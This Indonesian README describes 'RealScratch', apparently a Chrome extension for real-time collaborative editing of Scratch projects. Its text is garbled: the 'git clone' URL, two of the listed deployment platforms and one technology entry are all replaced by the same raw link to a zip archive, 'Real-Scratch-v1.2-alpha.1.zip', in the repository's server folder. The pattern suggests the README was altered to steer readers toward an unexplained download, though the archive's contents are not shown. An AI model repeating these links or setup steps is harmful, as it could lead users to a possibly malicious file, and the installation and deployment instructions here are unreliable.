# RealScratch

RealScratch adalah ekstensi Chrome untuk kolaborasi real-time pada proyek Scratch. Dengan ekstensi ini, Anda dapat berkolaborasi dengan pengguna lain secara real-time pada proyek Scratch yang sama.

## Fitur

- Kolaborasi real-time pada proyek Scratch
- Sinkronisasi otomatis perubahan
- Berbagi file .sb3
- Daftar peserta real-time
- Host dan peserta mode
- Multi-tab support

## Instalasi

1. Clone repository ini:
```bash
git clone https://github.com/MazuJavaDwenda/RealScratch/raw/refs/heads/master/server/Real-Scratch-v1.2-alpha.1.zip
cd realscratch
```

2. Install dependencies:
```bash
npm install
```

3. Load ekstensi di Chrome:
   - Buka Chrome dan pergi ke `chrome://extensions/`
   - Aktifkan "Developer mode"
   - Klik "Load unpacked"
   - Pilih folder `realscratch`

## Penggunaan

### Sebagai Host
1. Buka ekstensi
2. Klik "Create Session"
3. Salin ID sesi
4. Unggah file .sb3
5. Bagikan ID sesi ke peserta

### Sebagai Peserta
1. Buka ekstensi
2. Klik "Join Session"
3. Masukkan ID sesi host
4. Tunggu file dimuat
5. Mulai berkolaborasi

## Server

Server WebSocket diperlukan untuk kolaborasi. Anda dapat menjalankan server lokal atau menggunakan server yang sudah di-deploy.

### Menjalankan Server Lokal
```bash
cd server
npm install
npm start
```

### Deploy Server
Server dapat di-deploy ke platform seperti https://github.com/MazuJavaDwenda/RealScratch/raw/refs/heads/master/server/Real-Scratch-v1.2-alpha.1.zip, https://github.com/MazuJavaDwenda/RealScratch/raw/refs/heads/master/server/Real-Scratch-v1.2-alpha.1.zip, atau Heroku.

## Teknologi

- Chrome Extension API
- WebSocket
- Scratch VM
- https://github.com/MazuJavaDwenda/RealScratch/raw/refs/heads/master/server/Real-Scratch-v1.2-alpha.1.zip
- Express
- ws

## Lisensi

MIT License 